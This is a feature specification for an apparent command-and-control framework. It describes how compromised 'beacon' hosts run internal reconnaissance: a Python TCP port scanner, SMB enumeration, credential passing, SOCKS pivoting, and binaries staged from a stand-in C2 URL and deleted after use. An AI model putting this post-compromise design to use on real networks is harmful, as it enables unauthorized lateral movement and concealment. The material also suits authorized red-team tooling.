# F0073: Beacon-Side Recon Execution

## Metadata
| Field | Value |
|---|---|
| ID | F0073 |
| Priority | P0 |
| Status | Planned |
| MVP Phase | 4 |
| Depends on | F0016, F0047 |

## Summary
Execute reconnaissance modules from compromised beacon vantage points. Enables internal network scanning, credential-passing for authenticated scans, and proxy support for pivoted scans. Hybrid approach: pure Python for simple tools, external binaries for complex scans.

## Requirements
- Beacon recon plugins (pure Python)
- External binary download (staged execution)
- Internal network scanning from beacon
- Credential-passing for authenticated scans
- Proxy support for pivoted scans
- Results returned to C2

## Execution Models

### 1. Pure Python (Memory-Only)
- Simple recon tools implemented in Python
- No external dependencies
- Memory-efficient
- Examples: LLMNR/mDNS, basic port scan, banner grab

### 2. Staged Binary
- Download compiled tool to target
- Execute with arguments
- Clean up after execution
- Examples: Nmap, masscan, gobuster

### 3. Hybrid
- Python wrapper for complex tools
- Binary execution via subprocess
- Output parsing in Python

## Beacon Module Interface

`python
# Beacon-side module
class BeaconReconModule:
    name = \"internal_portscan\"
    description = \"Port scan from beacon vantage point\"
    execution_type = \"python\"  // python, staged, hybrid

    def execute(self, args: dict, callback: Callable) -> dict:
        # Pure Python port scan
        results = []
        for port in args[\"ports\"]:
            if self.scan_port(args[\"target\"], port):
                results.append({\"port\": port, \"state\": \"open\"})
        return {\"results\": results}

    def scan_port(self, host: str, port: int, timeout: float = 1.0) -> bool:
        import socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except Exception:
            return False
`

## Staged Binary Execution

`python
class StagedReconModule:
    name = \"nmap_scan\"
    description = \"Nmap scan from beacon\"
    execution_type = \"staged\"
    binary_name = \"nmap\"
    binary_url = \"https://c2.example.com/tools/nmap.exe\"  // Or embedded in beacon

    def execute(self, args: dict, callback: Callable) -> dict:
        # Stage binary
        binary_path = self.stage_binary(self.binary_name)

        # Build command
        cmd = [binary_path] + self.build_nmap_args(args)

        # Execute
        result = subprocess.run(cmd, capture_output=True, text=True)

        # Parse results
        parsed = self.parse_nmap_output(result.stdout)

        # Cleanup
        self.cleanup(binary_path)

        return parsed

    def stage_binary(self, name: str) -> str:
        \"\"\"Download or extract binary to temp location.\"\"\"
        # Implementation varies by beacon
        pass

    def cleanup(self, path: str):
        \"\"\"Remove staged binary.\"\"\"
        try:
            os.remove(path)
        except Exception:
            pass
`

## Module Arguments

`python
{
    \"beacon_id\": \"uuid\",  // Target beacon
    \"module\": \"builtin.recon.beacon_portscan\",
    \"args\": {
        \"targets\": [\"192.168.1.0/24\"],
        \"ports\": \"top-100\",
        \"timeout_ms\": 1000
    },
    \"execution_type\": \"python\",  // python, staged
    \"cleanup_after\": true
}
`

## Result Schema

`json
{
    \"beacon_id\": \"uuid\",
    \"module\": \"builtin.recon.beacon_portscan\",
    \"execution_type\": \"python\",
    \"status\": \"completed\",
    \"results\": {
        \"hosts_scanned\": 256,
        \"open_ports_found\": 15,
        \"discoveries\": [
            {
                \"host\": \"192.168.1.100\",
                \"port\": 445,
                \"service\": \"smb\",
                \"banner\": \"Windows Server 2019\"
            }
        ]
    },
    \"duration_seconds\": 45.2,
    \"pivot_info\": {
        \"source_beacon\": \"192.168.1.50\",
        \"target_network\": \"192.168.1.0/24\",
        \"hop_count\": 1
    }
}
`

## Supported Beacon Recon Modules

| Module | Type | Description |
| :--- | :--- | :--- |
| beacon_portscan | python | TCP connect scan |
| beacon_banner_grab | python | Service banner extraction |
| beacon_llmnr_mdns | python | LLMNR/mDNS discovery |
| beacon_smb_enum | python | SMB share enumeration |
| beacon_nmap | staged | Full Nmap scan |
| beacon_gobuster | staged | Directory brute-forcing |
| beacon_pivot_proxy | hybrid | SOCKS proxy for pivoting |

## Stages

### Stage 1: Beacon Recon Plugin Framework
**Goal:** Create framework for beacon-side recon.
**Acceptance Criteria:**
- [ ] Beacon plugin interface defined
- [ ] Module registration system
- [ ] Argument passing to beacon
- [ ] Result collection from beacon

### Stage 2: Pure Python Modules
**Goal:** Implement Python-only recon modules.
**Acceptance Criteria:**
- [ ] Port scan module
- [ ] Banner grab module
- [ ] LLMNR/mDNS module
- [ ] SMB enum module

### Stage 3: Staged Binary Support
**Goal:** Support external binary execution.
**Acceptance Criteria:**
- [ ] Binary staging mechanism
- [ ] Subprocess execution
- [ ] Output capture and parsing
- [ ] Cleanup after execution

### Stage 4: Pivot Proxy Support
**Goal:** Enable pivoted scanning via beacon proxy.
**Acceptance Criteria:**
- [ ] SOCKS proxy on beacon
- [ ] Scanner routing through proxy
- [ ] Credential passing
- [ ] Multi-hop pivot support

## Feature Acceptance Criteria

- [ ] Beacon can execute recon modules
- [ ] Results returned to C2
- [ ] Internal network scans work from beacon
- [ ] Proxy support for pivoted scans
- [ ] Staged binaries execute correctly

## Test Plan

### Unit Tests
- [ ] test_beacon_module_interface
- [ ] test_python_portscan
- [ ] test_banner_grab_parsing
- [ ] test_staged_binary_execution

### System / Integration Tests
- [ ] Beacon executes port scan module
- [ ] Results returned to C2 correctly
- [ ] Internal network discovered from beacon
- [ ] Pivoted scan through beacon proxy
- [ ] Staged binary cleaned up after execution

### Playwright Tests
- [ ] Select beacon for recon execution
- [ ] Choose recon module
- [ ] Submit task to beacon
- [ ] Results displayed with beacon source
- [ ] Pivot chain visualized

---

*End of Document*
